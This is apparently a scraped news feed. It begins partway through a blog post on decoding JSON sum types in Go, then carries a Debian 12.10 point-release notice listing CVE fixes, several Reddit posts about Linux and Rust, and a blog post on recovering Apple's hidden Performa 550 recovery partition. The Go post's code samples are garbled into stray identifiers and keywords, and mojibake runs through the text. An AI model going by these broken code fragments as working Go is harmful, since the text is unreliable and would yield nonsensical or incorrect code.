	Object Object a Actionany errThe decoding works essentially the same, first decode enough to check the  field, then according to its value unmarshal into one of the action structs (, , etc.). The  documentation actually has a similar example.Since delaying JSON decoding wasn't particularly useful in my case, I didn't choose this route. But I wanted to mention it for completeness' sake.What about  (aka "Protobuf")? I found the following particularly interesting in their Go generated code guide:For a oneof field, the protobuf compiler generates a single field with an interface type . It also generates a struct for each of the singular fields within the oneof. These all implement this  interface.Let's try it out. Even though we're working with a JSON API, a Protobuf definition for our data model could look like this: value  create_object  update_object  delete_object  delete_all_objects  object The generated code indeed creates an interface  with a single method, as well as an  struct that holds a field with that interface type: Action 
	Value isAction_Value  isAction_Value  Action_CreateObject 
	CreateObject CreateObject Action_CreateObjectNow these two code generators, OpenAPI and Protobuf, will be the inspiration for my second attempt at decoding the JSON sum type in a more type-safe way...Decoding JSON sum types in Go, take twoAfter a bit of searching on the topic of "Go sum types", I stumbled across this: go-check-sumtype. From the README:A typical proxy for representing sum types in Go is to use an interface with an unexported method and define each variant of the sum type in the same package to satisfy said interface. This guarantees that the set of types that satisfy the interface is closed at compile time.This "interface with an unexported method" (also called "sealed interface", or "marker interface") sounded like a reasonable way to do it. And it's also what the Protobuf codegen seems to be using.I replaced my single "bag of all the fields"  struct with a sealed interface  and a struct for each variant (, , etc.). Each variant struct implements the interface: IsAction  CreateObject 
	Object Object CreateObject UpdateObject 
	Object Object UpdateObject DeleteObject 
	ID DeleteObject DeleteAllObjects DeleteAllObjectsNow I am quite pleased. Not only do these action-specific structs provide more type-safety, but if I forget to handle a variant in my  statement (or if I add a new one that implements the sealed interface), the  linter will catch it instead of getting an error at runtime!action Action result  v  actionCreateObject
		result  fmt vObjectType vObjectID vObjectNameUpdateObject
		result  fmt vObjectType vObjectID vObjectNameDeleteObject
		result  fmt vIDDeleteAllObjects
		result  result
I still needed to figure out how to decode the JSON sum types payload into this interface and structs. You can't unmarshal into an interface value directly, you need to pass a concrete type. So I created a wrapper struct like so: Action 
	value IsAction
I also found the exhaustive linter, so why stop at sum types when you can also have enums! I defined one for action types, which are used as "tags" in my tagged union, along with the proper methods for JSON and string representations: ActionType 
	ActionType_CreateObject ActionType 
	ActionType_UpdateObject
	ActionType_DeleteObject
	ActionType_DeleteAllObjects
t ActionTypet ActionTypedata t ActionTypeI then defined  for my  wrapper struct like so:a Actiondata  tag 
		Type ActionType  err  jsondatatag err  err
	 v IsAction
	 tagType  ActionType_CreateObject
		v CreateObject ActionType_UpdateObject
		v UpdateObject ActionType_DeleteObject
		v DeleteObject ActionType_DeleteAllObjects
		v DeleteAllObjects err  jsondata v err  err
	

	avalue  v
	This works similarly to what we saw in the OpenAPI generated code:first decode only what is needed in the JSON to check the  fieldsecond, according to the value of , choose the appropriate variant struct of the sum type (, , etc.) and use it to decode the JSON payloadFor the other way around, I also defined  for the wrapper struct:a Action
	v  avalue

	data err  jsonv err  err
	 tagged any
	 err  jsondatatagged err  err
	 vCreateObject
		tagged ActionType_CreateObject
	UpdateObject
		tagged ActionType_UpdateObject
	DeleteObject
		tagged ActionType_DeleteObject
	DeleteAllObjects
		tagged ActionType_DeleteAllObjects
	 jsontaggedfirst encode the wrapped interface as JSON (unlike decoding, we can do this because the interface here will be initialized with an underlying concrete type: , , etc.)second, to add the tag in the  field, we do a roundtrip: decode into a , add the tag to that map, and re-encode the map into JSONNotice that I use the  linter in  to make sure I handle all possible tags, and I use the  linter in  to make sure I handle all possible variant structs. So given I keep the "enum" and "sum type" up-to-date, I will have exhaustiveness checking in both these methods (in addition to other methods or functions, such as  we saw earlier).That's it! Yes, there is a bit of boilerplate, but if one is using Go they are probably already OK with a little boilerplate here and there. Also, between AI coding assistants and other codegen tools, the cost of boilerplate can be mitigated. And finally there is that thing we say, "code is read (and maintained) much more often than written"? So I'd argue the added type-safety and the fact that we catch issues at compile time instead of runtime may be worth the tradeoff.Alternative implementationsOf course, the implementation described above is only  of decoding JSON sum types in Go. Below are a couple alternatives, some of which we've already mentioned. Action 
	createObject     CreateObject
	updateObject     UpdateObject
	deleteObject     DeleteObject
	deleteAllObjects DeleteAllObjects
 Action 
	payload jsonRawMessage
With the "sealed interface" approach I ended up using, I also considered an implementation of  that doesn't require an encode/decode roundtrip to add the tag, at the cost of a bit more boilerplate. It uses struct embedding instead (full example here):a Action data  err  v  avalueCreateObject
		tagged 
			Type ActionType 
			CreateObject
		
			Type         ActionType_CreateObject
			CreateObjectv
		data err  jsontagged data err
Finally, it is worth mentioning that there are different ways to represent sum types in JSON, notably: (the one used in this article): {"type": "delete_object", "id": "1", "soft_delete": true}: {"type": "delete_object", "value": {"id": "1", "soft_delete": true}}: {"delete_object": {"id": "1", "soft_delete": true}}The naming is taken from the Rust library Serde's documentation, which provides a good explanation and examples for each representation.All JSON representations are possible with the Go implementation of sum types described in this post (you can find the adjacently tagged full example here).What Go could have been: V lang?I'll let the project's website do its own marketing:V is very similar to Go. If you know Go, you already know â‰ˆ80% of V.[...] V is very similar to Go, and its domain is similar to Rust's [...]Wait... The simplicity of Go, but with enums and sum types? Yes, please!I tried porting my example to V, and I have to admit it works out quite nicely (full source here):
	user
	group

	id   
	name 
	object Object

	object Object

	id  CreateObject  UpdateObject  DeleteObject  DeleteAllObjects

action Action action 
		CreateObject 
		UpdateObject 
		DeleteObject 
		DeleteAllObjects The  expression has exhaustiveness checking, of course. And the  sum type decodes from/encodes to JSON right out-of-the box (with the caveat that, at the time of writing, it uses the adjacently tagged representation with no way of configuring it).Before getting too excited it is worth noting that V is very much a niche language, and can't be compared to Go's popularity and ecosystem. Our industry works in mysterious ways, who knows why some languages gain traction while others don't. Also, this might have some truth to it:There are only two kinds of languages: the ones people complain about and the ones nobody uses.Bjarne Stroustrup, The C++ Programming LanguageNevertheless, I found the V language interesting! It's a garbage-collected language that seems to have found a sweet spot between Go's simplicity and Rust's powerful type system.Examples in other languagesIf you made it this far, I'll leave you with a link to this repository. It contains an implementation of the example sum type from this article, with JSON encoding/decoding (where applicable), in the following languages:]]></content:encoded></item><item><title>Debian point release 12.10.....if you care and use.</title><link>https://www.debian.org/News/2025/20250315</link><author>/u/unixbhaskar</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 04:42:04 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[The Debian project is pleased to announce the tenth update of its
stable distribution Debian 12 (codename ).
This point release mainly adds corrections for security issues,
along with a few adjustments for serious problems. Security advisories
have already been published separately and are referenced where available.Please note that the point release does not constitute a new version of Debian
12 but only updates some of the packages included. There is
no need to throw away old  media. After installation,
packages can be upgraded to the current versions using an up-to-date Debian
mirror.Those who frequently install updates from security.debian.org won't have
to update many packages, and most such updates are
included in the point release.New installation images will be available soon at the regular locations.Upgrading an existing installation to this revision can be achieved by
pointing the package management system at one of Debian's many HTTP mirrors.
A comprehensive list of mirrors is available at:This stable update adds a few important corrections to the following packages:Fix crash when modifying userPassword using malformed input [CVE-2024-2199 CVE-2024-8445]; prevent denial of service while attempting to log in with a user with a malformed hash in their password [CVE-2024-5953]; prevent denial of service on the directory server with specially-crafted LDAP query [CVE-2024-3657]New upstream bugfix releaseFix tests causing FTBFS on the auto-builder networkFix unintended HTTPS upgrades or premature reversion to HTTP when both subdomains and parent domains are used [CVE-2024-9681]; prevent stopping of stunnel before retries in the built-time tests; fix possible credentials leakage issues [CVE-2024-11053 CVE-2025-0167]; fix test failures due to port clashesDo not cache result of get_default_value_for_fieldFix issue when rendering an invalid monochrome DICOM image [CVE-2024-47796]; ensure: HighBit < BitsAllocated [CVE-2024-52333]; fix possible overflows when allocating memory [CVE-2024-27628]; fix two segmentation faults [CVE-2024-34508 CVE-2024-34509]; fix arbitrary code execution issue [CVE-2024-28130]; fix buffer overflow issues [CVE-2025-25472 CVE-2025-25474]; fix NULL pointer dereference issue [CVE-2025-25475]Increase Linux kernel ABI to 6.1.0-32; rebuild against proposed-updatesAdd missing parameters for source upload targetFix authentication bypass [CVE-2024-21543]Fix overflow condition in PeCoffLoaderRelocateImage() [CVE-2024-38796]; fix potential UINT32 overflow in S3 ResumeCount [CVE-2024-1298]Fix tests on machines with 2 vCPU or fewerFix sandbox bypass vulnerability in Nasal scripts [CVE-2025-0781]Fix build failure on single-CPU machinesFix buffer overflow when printing assertion failure message [CVE-2025-0395]; fix memset performance for unaligned destinations; fix TLS performance degradation after dlopen() usage; avoid integer truncation when parsing CPUID data with large cache sizes; ensure data passed to the rseq syscall are properly initializedNew upstream security release [CVE-2023-34440 CVE-2023-43758 CVE-2024-24582 CVE-2024-28047 CVE-2024-28127 CVE-2024-29214 CVE-2024-31068 CVE-2024-31157 CVE-2024-36293 CVE-2024-37020 CVE-2024-39279 CVE-2024-39355]Fix arbitrary code execution issues [CVE-2024-56201 CVE-2024-56326]Fix build failure on single-CPU systemsFix CSRF vulnerability on 2FA registration interface [CVE-2024-52948]Set correct default permissions for shared memory [CVE-2024-46544]Fix buffer overflow vulnerability [CVE-2023-32181 CVE-2023-22652]Add option to read username/password from file [CVE-2023-35789]Fix out-of-bounds read in gnu_longlink() [CVE-2021-33643]; fix out-of-bounds read in gnu_longname() [CVE-2021-33644]; fix memory leak in th_read() [CVE-2021-33645]; fix memory leak in th_read() [CVE-2021-33646]New upstream release; bump ABI to 32Fix multi axes movement on single axis G0 MDI callNew upstream stable release; fix security issue [CVE-2024-21096]; fix denial of service issue [CVE-2025-21490]Impose response limits on HTTP server connections [CVE-2025-26819]Install fcitx icons to the correct locationsIgnore test warnings from astropyFix possible bypass of client certificate authentication [CVE-2025-23419]Fix CSRF vulnerability [CVE-2023-45857]; fix potential vulnerability in URL when determining an origin [CVE-2024-57965]Fix mishandling of non-integer values leading to denial of service in nanoid [CVE-2024-55565]; fix parsing of external untrusted CSS [CVE-2023-44270]Fix build failure arising from changed timeout APINew upstream stable release; harden PQescapeString and allied functions against invalidly-encoded strings; improve behavior of libpq's quoting functions [CVE-2025-1094]Fix behavior when parsing chunked transfer encoding bodies and zero-length Content-Length headers [CVE-2023-40175]; limit size of chunk extensions [CVE-2024-21647]; prevent manipulation of headers set by intermediate proxies [CVE-2024-45614]Fix regular expression-based denial of service issue [CVE-2023-36053], denial of service issues [CVE-2024-38875 CVE-2024-39614 CVE-2024-41990 CVE-2024-41991], user enumeration issue [CVE-2024-39329], directory traversal issue [CVE-2024-39330], excessive memory consumption issue [CVE-2024-41989], SQL injection issue [CVE-2024-42005]Run tests only if /tmp is tmpfs, otherwise they are known to failAvoid segmentation fault if a SIGTERM is received during startupFix parallel running of testsFix sandbox bypass vulnerability in Nasal scripts [CVE-2025-0781]Apply GPO policy consistently [CVE-2023-3758]Fix vulnerable parsing of control characters in paths served by mod_dav_svn [CVE-2024-46901]Ignore test warnings from astropyNew upstream release; update data for Paraguay; update leap second informationFix URL of public Vagrant registryFix crash when expanding  in substitute [CVE-2023-2610]; fix buffer-overflow in vim_regsub_both() [CVE-2023-4738]; fix heap use after free in ins_compl_get_exp() [CVE-2023-4752]; fix heap-buffer-overflow in vim_regsub_both [CVE-2023-4781]; fix buffer-overflow in trunc_string() [CVE-2023-5344]; fix stack-buffer-overflow in option callback functions [CVE-2024-22667]; fix heap-buffer-overflow in ins_typebuf (CVE-2024-43802]; fix use-after-free when closing a buffer [CVE-2024-47814]; fix build failure on 32-bit architecturesFix mishandling of semicolons in userinfo in URLs [CVE-2024-38428]Allow direct kernel boot with kernels >= 6.12This revision adds the following security updates to the stable release.
The Security Team has already released an advisory for each of these
updates:The following packages were removed due to circumstances beyond our control:The installer has been updated to include the fixes incorporated
into stable by the point release.The complete lists of packages that have changed with this revision:The current stable distribution:Proposed updates to the stable distribution:stable distribution information (release notes, errata etc.):Security announcements and information:The Debian Project is an association of Free Software developers who
volunteer their time and effort in order to produce the completely
free operating system Debian.For further information, please visit the Debian web pages at
https://www.debian.org/, send mail to
<press@debian.org>, or contact the stable release team at
<debian-release@lists.debian.org>.]]></content:encoded></item><item><title>What is Valve&apos;s end goal with linux and gaming?</title><link>https://www.reddit.com/r/linux/comments/1jcd0vy/what_is_valves_end_goal_with_linux_and_gaming/</link><author>/u/Karmic_Backlash</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 03:51:33 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[I'll be the first to admit that I am a bit of a fan of valve if only at least in Stockholm Syndrome. I own a steamdeck and use their storefront, and have bought many games from them. However, as a linux user, over the years I've developed a strange feeling about their linux push. So, first thing thats crossed my mind is their main selling point in the space, Proton (and by proxy, wine). The whole idea is running windows applications and specifically games on linux. But that doesn't really feel like a long term solution. It basically requires that anything to do with gaming necessarily depends on windows and its systems. If people just stopped making windows builds of their stuff then linux gaming would suffer just as much.You would think that by now they would have tried to address this, and while I know the classic XKCD joke of "14 Competing Standards" rings here, but Valve has the best chance out of everyone to try, even if it fails, they'd still ideally have wine to fall back on.My second question is more to do with their lack of any movement outside of gaming. Don't get me wrong, they are a  platform and gaming focused developer. I'm not expecting them to shoulder the whole of the desktop on their shoulders, but it would be a serious feather in their cap to directly advertise that their software can do more then  gaming. The whole desktop mode of their flagship distro is fully featured just like any other.Third question, and this is more of a plea for context if it exists then a question, have they said anything about their long term goals anywhere, because I haven't heard anything. I'd love to know if they do actually have a roadmap, if only to know how to set my expectations.]]></content:encoded></item><item><title>Dioxus 0.6 is incredible, why isn&apos;t anyone talking about it.</title><link>https://www.reddit.com/r/rust/comments/1jcar25/dioxus_06_is_incredible_why_isnt_anyone_talking/</link><author>/u/Incredible_guy1</author><category>dev</category><category>reddit</category><category>rust</category><pubDate>Sun, 16 Mar 2025 01:43:33 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Rust</source><content:encoded><![CDATA[Iv'e been using tauri for a while to build my desktop apps and whiles its an amazing tool, a few of my complains include:projects become too complex to manageDioxus basically fixes all of this and keeps everything in native rust , while using a tsx-like syntax for building , how does this not get the spotlight?]]></content:encoded></item><item><title>I built a crate to generate LSP servers using Tree-sitter queries.</title><link>https://www.reddit.com/r/rust/comments/1jcajk7/i_built_a_crate_to_generate_lsp_servers_using/</link><author>/u/adclz</author><category>dev</category><category>reddit</category><category>rust</category><pubDate>Sun, 16 Mar 2025 01:32:43 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Rust</source><content:encoded><![CDATA[This is my second side project in Rust. There are probably some issues, and I havenâ€™t implemented all the features I have in mind yet.The main inspiration comes from GitHubâ€™s StackGraph. Since VS Code released an SDK last summer that allows LSP servers to run when compiled to WASI, I wanted to create something that could generate a cross-platform extension from any Tree-sitter grammar.It all started as a draft, but I ended up enjoying working on it a bit too much.]]></content:encoded></item><item><title>Apple&apos;s long-lost hidden recovery partition from 1994 has been found</title><link>https://www.downtowndougbrown.com/2025/03/apples-long-lost-hidden-recovery-partition-from-1994-has-been-found/</link><author>chmaynard</author><category>dev</category><category>hn</category><pubDate>Sun, 16 Mar 2025 00:07:03 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[In my last post about hard drives that go bad over time, I hinted at having rescued a lost piece of obscure Apple software history from an old 160 MB Conner hard drive that had its head stuck in the parked position. This post is going to be all about it. Itâ€™s the tale of a tad bit of an obsession, what felt like a hopeless search, and how persistence eventually paid off. Thereâ€™s still an unsolved mystery too, so Iâ€™m hoping others will see this and help to fill in the blanks!The LC 550â€™s Secret PartitionIf Appleâ€™s programmers, in creating the Performa series, were aiming to make idiot-proof computers, they were serious about it. The Performa 550 is an amazing case in point. When you run the included Apple Backup program (see Chapter 15), you get a little surprise that you didnâ€™t count on: a  on your hard drive!This invisible chunk of hard drive space contains a miniature, invisible System Folder. Appleâ€™s internal memo explains it this way:â€œWhen a system problem (one that prevents the Performa from booting) is detected, a [dialog box] informs the user of a system problem. The user can choose to fix the problem manually or to reinstall software from the backup partitionâ€™s Mini System Folder.â€If you choose to reinstall your System software, you get the wristwatch cursor for a moment while the miniature System Folder is silently copied to your main hard-drive partition. The Performa restarts from the restored hard drive, and the invisible system partition disappears once again.We got a Performa team member to admit that this kind of sneaky save-the-users-from-themselves approach may well be adopted in other Performa models.Who knows what goodness lurks in the hearts of men?Cool! Although I have owned my own copy of this book for decades, I had no recollection of ever reading this little blurb. The book, if youâ€™re curious, is Macworld Mac Secrets by David Pogue and Joseph Schorr. I found this whole functionality very intriguing, particularly because I had what felt like a very personal connection to it: the very first Mac that my family had when I was growing up was a Performa 550. I donâ€™t think I have any pictures from back then, but in the meantime Iâ€™ve acquired one that looks exactly identical, so hereâ€™s a (slightly blurry) view of the type of machine Iâ€™m talking about in this post:I know that many people think the LC/Performa 5xx case style is ugly, but I really like it! Iâ€™m definitely biased though.This is an early model manufactured in September of 1993, which came with a caddy-loading CD-ROM drive (AppleCD 300i). Like other Macs from the same era, newer versions from 1994 came with a tray-loading drive instead (AppleCD 300i Plus). For comparison, hereâ€™s a photo of a late-model Performa 550 with a manufacture date of March 1994 that re4mat kindly gave me permission to share here:Pierre asked me if I had a copy of Appleâ€™s software restoration CD for the Performa 550, and if I knew how to get it working in an emulator in order to try out this special functionality. I pointed him to a download link for the Performa CD for the 500 Series, version 7.1P6:If you werenâ€™t using multimedia computers in the early 1990s, you might not recognize the weird rectangular container that this CD is enclosed inside of. Itâ€™s a CD caddy, and itâ€™s what was used for inserting CDs into computers like the first one pictured above. You would open the caddy by squeezing the top right and bottom right ends toward each other, stick the disc into it, close it, and then push it into the slot in the computer, similarly to how you would insert a floppy disk. I really donâ€™t miss these things one bit!Back to the story, though. I also gave Pierre some tips for using the restore CD in an emulator. Nowadays, my advice is outdated because itâ€™s much easier to use Apple restore CDs in at least one emulator â€” MAME has come a long way in the last few years. He figured out a bunch more stuff on his own after that, including trying it in his own Performa 450 (not 550), but the bottom line was that the recovery partition was nowhere to be found.Well, sort of. He found that the process of restoring from the CD actually did create a recovery partition. Hereâ€™s a screenshot of the partitioning from inside of Apple HD SC Setup while booted from the Performa CD, after formatting the hard drive by clicking the Initialize button in the main window:As you can see, thereâ€™s a 2,560 KB partition of type Apple_Recovery almost at the end of the drive, just after the main partition named â€œHard Diskâ€. This was promising at first glance, but the partition was empty! Further testing revealed that the custom Performa-specific version of Apple HD SC Setup (7.2.2P6) bundled on the CD was responsible for creating it, but didnâ€™t actually populate it with any data. Apple Backup also didnâ€™t put anything onto the partition, despite what the book said. I even looked through my past disassemblies of the Apple Backup and Apple Restore code and confirmed that there was nothing related to creating a recovery partition.The conclusion at the time was that someone needed to get ahold of a Performa 550 that still had its original hard drive and had never been reformatted. Thatâ€™s where this story sat for 3 years. A few months ago, I remembered this whole situation and decided that I really wanted to try to find this partition. After all, the clock had always been ticking. The longer we waited, the fewer and fewer original Performa 550s would be out there in the wild. Not to mention that hard drives go bad and people throw them out without knowing that itâ€™s usually possible to recover data from drives of this era. I confirmed all of Pierreâ€™s findings in MAME. I even tried using Apple Backup in case I missed something, but no, it didnâ€™t do anything with the hidden recovery partition. An easy way to look at it is to manually edit the partition table in a hex editor and change the type from Apple_Recovery to Apple_HFS.After doing this and booting up, I found another hard drive icon on my desktop called Recovery Volume, but it was empty, just like Pierre said:Taking it a bit further, I tried recreating the recovery functionality myself. I copied a minimal system folder to the Recovery Volume, and then changed its type back to Apple_Recovery. This made it invisible again. Then I screwed up my main system folder and rebooted. Sure enough, it automatically came up with the Recovery Volume as the main boot volume.This proved that the mechanism for booting from the recovery partition worked; we were just missing the data that was supposed to be on it. I came to the same conclusion that Pierre had already reached: we needed to find a Performa 550 that had never been reformatted. In the meantime, I spent some time digging into archives of Appleâ€™s old tech notes and found several more references to this functionality.Backup Partition Software-automatically detects corrupted system folders. When a bad System Folder is detected, the user is given the option to re-load another System Folder into their system.The Apple Backup application creates a backup recovery partition that allows the Performa to boot even when the System Software on the main hard drive has been corrupted. The partition is invisible to the user.There is no built-in limit to the number of times the backup partition can be used. However, the partition will be lost if the hard drive is re-formatted. At this time the backup partition is used only on the Performa 550.Performa 550: System Folder Created w/ Dinosaur Safari CD (8/94) â€” not that I needed any more proof of the recovery partitionâ€™s existence at this point, but I got a kick out of this one. It talks about how launching an educational game about dinosaurs accidentally caused the system to go into recovery mode. It provided a little more info about what would happen when the recovery dialog popped up:When I launch the Dinosaur Safari CD from Creative Multimedia, a dialog box appears telling me that my Performa computer is having trouble starting up. I only have two options Shutdown or Continue? Why?After reading these articles, I was very convinced that the recovery partition was a real thing that existed, but I was also pretty confident that Apple Backup wasnâ€™t responsible for creating it, despite Apple claiming otherwise. I had already seen that the special build of Apple HD SC Setup was what actually created it, and plus, like I said earlier, I had looked closely into a disassembly of the version of Apple Backup supplied with the Performa 500 series restore CD. There was nothing that copied any files to another partition on the hard drive, at least not that I could see.Really, the most important thing I gained from this exercise was that the second tech note confirmed the need to find a Performa 550 that had never been reformatted. Also, if the first tech note was to be believed, it needed to have come with System 7.1P6. This could narrow the search even further â€” I know for a fact that earlier Performa 550 models came with 7.1P5, including my childhood one. The same tech note also pointed out that 7.1P6 was the first version to support the â€œAppleCD 300+â€, which is referring to the tray-loading CD-ROM drive. Based on this information, itâ€™s reasonable to deduce that all Performa 550s with a tray-loading CD-ROM drive would probably have originally come with at least System 7.1P6.There was only one thing left to try at this point: asking the Internet for help. I asked people everywhere I could think of: Tinker Different, 68kMLA (where Pierre had already asked), and various social media sites. I searched Reddit and found people who had posted in the past about having a 550, asking if they still had the hard drive. I think I scared some of them â€” at least one person deleted their post after I asked! To be honest, I canâ€™t blame them. I can imagine how freaky it would be to hear from someone begging to look at my hard driveâ€™s contents. Iâ€™m sure some people might think of it as crossing a line, but itâ€™s not as crazy of an ask if itâ€™s a machine theyâ€™ve received second-hand from someone else. Plus, I was very clear about exactly what I was looking for (and why).I asked a seller of a Performa 550 that had been sitting on eBay for a long time if they would be willing to sell me the hard drive separately. They werenâ€™t interested. I even bought some random hard drives on eBay that definitely went with a 5xx-style case. These were easy to identify because this case style uses a unique adapter for plugging the drive into the chassis wiring harness when you slide it into place.What do I have to show for all of these eBay purchases? Well, after dumping them all with my ZuluSCSI in initiator mode, I can say that the one pictured above came from a Macintosh TV. I also found another one from an LC 575. Lastly, I bought yet another drive that the seller said came from a Performa 577. The Performa 577 one was funny â€” it had all the Mac mounting hardware on it, but when I dumped it, it turned out to be from an Atari TT or Falcon (not sure which). Iâ€™d love to hear the story of how it ended up with an LC 5xx drive sled and adapter on it! Needless to say, none of them had the elusive recovery partition. One particularly friendly eBay seller was even nice enough to show me a preview of a driveâ€™s contents in HFSExplorer, which helped me determine that it wasnâ€™t from a Performa.I almost began questioning my sanity at one point during this search. Multiple people initially told me that they thought I was confused about this whole thing. I pointed them toward Appleâ€™s tech notes describing it. Were Pierre and I imagining this whole thing? Were Appleâ€™s tech notes all a lie?The thing is, this whole functionality was super obscure. Itâ€™s understandable that people werenâ€™t familiar with it. Apple publicly stated it was only included with this one specific Performa model. Their own documentation also said that it would be lost if you reformatted the hard drive. It was hiding in the background, so nobody really knew it was there, let alone thought about saving it. Also, I can say that the first thing a lot of people do when they obtain a classic computer is erase it in order to restore it to the factory state. Little did anyone know, if they reformatted the hard drive on a Performa 550, they could have been wiping out rare data that hadnâ€™t been preserved!Someone who saw my post on Reddit mentioned that they had a Performa 550 and would check it out. It was a newer tray-loading model with a January 1994 manufacture date. Unfortunately, the Conner hard drive inside of it wouldnâ€™t cooperate, and plus this person didnâ€™t have anything capable of dumping the contents. Luckily for me though, they were totally comfortable with letting me borrow the drive and try to recover the data from it.To tie everything together, we have now reached the point in this story that I covered in my last post about hard drives with stuck heads. As I mentioned in that blog, I could not get this drive to do anything. It would just spin up, sit there for a while, spin down, and then make an annoying buzzing sound for a while, repeating that whole process over and over again.I tried all kinds of things. I nudged the head while the platters were spinning, inspected it with my thermal camera to see if any components were getting hot, and tried it at different temperatures â€” cold shortly after it arrived, and at room temperature later. The only thing I noticed was that when it was making the buzzing sound, one of the IRFD123 MOSFETs would get much hotter than normal: up near 100 degrees Celsius.I wasnâ€™t really sure what to do with this information though. It just seemed wrong that the head wasnâ€™t moving at all. Thatâ€™s when I finally decided to inspect everything further inside the drive and noticed the head stack seemed like it was sticking to a rubber/plastic looking piece. The Kapton tape trick I figured out and showed off in the last post finally allowed me to dump the drive contents. If you didnâ€™t catch it last time, hereâ€™s a video showing how it was stuck, along with a successful dump with the help of the tape:As soon as the drive imaging process completed, I powered everything off and anxiously opened the hard drive image file with my favorite hex editor (HxD):Boom! This drive had a recovery partition on it! Now, that didnâ€™t necessarily mean anything. After all, I had already seen an empty partition created by Apple HD SC Setup on the Performa CD. Still, though, it was definitely promising. Hereâ€™s an interpretation of the data at the beginning of the entry in the partition table:50 4D = PM = Signature00 00 = Padding00 00 00 05 = 5 total partitions on the drive00 04 E2 60 = starting physical block of the partition (0x4E260 blocks = 0x9C4C000 bytes)00 00 14 00 = size of partition in blocks (0x1400 blocks = 0x280000 bytes = 2560 kilobytes)name = MacOSAlso, just like in the partition table created by the Performa CD that I had inspected earlier, there were four bytes â€œmsjyâ€ at an offset of 0x9C bytes into the partition table entry. No other partitions had any data at 0x9C. I wonder if these are a couple of developersâ€™ initials hiding in there or something? Is it an acronym? â€œMake Steve Jobs Yodelâ€? I even asked ChatGPT to come up with a playful interpretation in the context of Macs in the mid-1990s. It suggested â€œMy System Jammed Yesterdayâ€, explaining it as a playful nod to the â€œchaotic charmâ€ of the eraâ€™s extension conflicts and Sad Mac screens. I didnâ€™t even mention anything about it involving OS recovery. Tell me how you really feel about old Macs, ChatGPT!Knowing that the partition was there, the next step was to look near the end of the dumped drive image in HxD. If the partition had any actual data stored, it would be very obvious because starting at 0x9C4C000 in the file, there would be actual data and not just a bunch of zeros.This is where I started to actually get excited. The partition contained boot blocks! This was obvious because of the starting signature of LK and all of the various system file names plainly visible. On the other hand, the recovery partition created by the Performa CD during testing had zeros at this location â€” no boot blocks.These boot blocks are identical to the main partitionâ€™s boot blocks, except for one very important difference: at 0x1A, the Pascal string containing the Finder name is â€œrecoveryâ€ instead of â€œFinderâ€ like youâ€™d normally see. This means that if you boot from this partition, it will load a program named recovery instead of the usual Finder app youâ€™d expect on most Mac OS installs.This was definitely something special that the restore CD was not capable of recreating. As I scrolled further down through the partition, it quickly became obvious that it actually had some files!Okay, now I was totally stoked! I booted up a copy of the imaged drive in MAME and immediately noticed that there was evidence that the recovery partition had definitely activated itself on this machine in the past: there was a folder named  on the desktop with a creation date in 2004, and the trash contained an app called Read Me Mini System Folder with the exact same date.I wanted to experience the automatic OS recovery process for myself without any customizations from the original owner of the machine this hard drive came from, so I used HxD to copy the entire 2,560 KB recovery partition onto the fresh hard drive image I had created by restoring from the Performa CD. This was easy because the Performa version of Apple HD SC Setup had created an empty recovery partition with the exact same size. Then I booted it up in MAME and dragged the System file out of my System Folder in order to intentionally mess it up. I had to turn off System Folder Protection in the Performa control panel first:This is the classic kind of mistake that would have normally left you with an unbootable system showing a floppy disk icon with a flashing question mark. Would Appleâ€™s automatic Performa OS recovery save me from myself? I rebooted to see what would happen. Instead of seeing a flashing question mark, I saw a Happy Mac very briefly before the system rebooted itself again. Then another Happy Mac showed up, and this time, it looked like a normal boot, except no extension icons showed up at the bottom of the screen. It was definitely booting from the recovery partition. Eventually, I was greeted with this screen:Hooray! This was exactly the dialog box that Macworld Mac Secrets and Appleâ€™s tech note had referred to. The recovery partition had been successfully rescued!Letâ€™s walk through the rest of this feature. If you click Shut Down, obviously the machine turns itself off. But when it boots back up, the recovery partition doesnâ€™t automatically kick in anymore. So youâ€™re on your own to fix the problem by booting from the Performa CD or the Utilities floppy disk.On the other hand, clicking OK does exactly what the tech note describes. You get the wristwatch cursor for a few seconds, the system reboots, and then you are greeted with this amazing screen, complete with an ugly yellow desktop pattern. Shall we call it the yellow screen of shame? Notice that the Mini System Folder on the desktop is the active System Folder, because it has the special icon.Here are the rest of the pages in this Read Me Mini System Folder app:Aha! So itâ€™s not entirely automatic, since you still have to manually drag the System, Finder, and System Enablers from the Mini System Folder back to your original System Folder. Still though, itâ€™s a very handy solution that gives you a bootable machine when something goes wrong with your OS.If you just ignore these instructions and keep using the computer, you will be nagged with this Read Me on every boot because it lives inside the Startup Items folder of the Mini System Folder. The Read Me also appears on your desktop, but for some reason it doesnâ€™t show up until you open the Hard Disk icon.Letâ€™s take a deeper look at how it all works by temporarily changing the partition type to Apple_HFS instead of Apple_Recovery and booting up again, so we can inspect the files. After a quick automatic rebuild of the desktop file, the Recovery Volume appears, with actual contents this time!Inside of the System Folder, there are definitely some interesting things. As expected based on the earlier analysis of the boot blocks, there is an app named â€œrecoveryâ€ that contains all of the interesting stuff. The icons are kind of arranged willy-nilly in here.The creator code of the recovery app is msjy â€” the exact same magic value we saw in the partition table entry.Scrolling further down, there is a System file and various enablers. Everything is marked as being part of System Software v7.1P6.Itâ€™s interesting to me that although this recovery partition was only available on the 550, it still has a bunch of enablers for other Performa models: the 45x/46x, 47x/57x, and 600. I guess thatâ€™s not too crazy considering all of these exact same enablers are included with a fresh copy of System 7.1P6 installed using the Performa CD.As a quick detour, System Enabler 316 is an interesting one that is hard to find info about on the Internet. I inspected its â€˜gblyâ€™ resource and determined that itâ€™s for the Centris 610, Centris 650, and Quadra 800. Itâ€™s an older version of the enabler created before the speed-bumped Quadra 610 and Quadra 650 were a thing. I wonder if there was a plan at some point to have a Performa model based on one of those machines? If I had to guess, maybe it would have been a 68040-based successor to the Performa 600, which uses the same case style as the Centris 650. The Performa 650?Letâ€™s not get too far off track. Back to the Recovery Volumeâ€™s System Folder â€” as expected, the 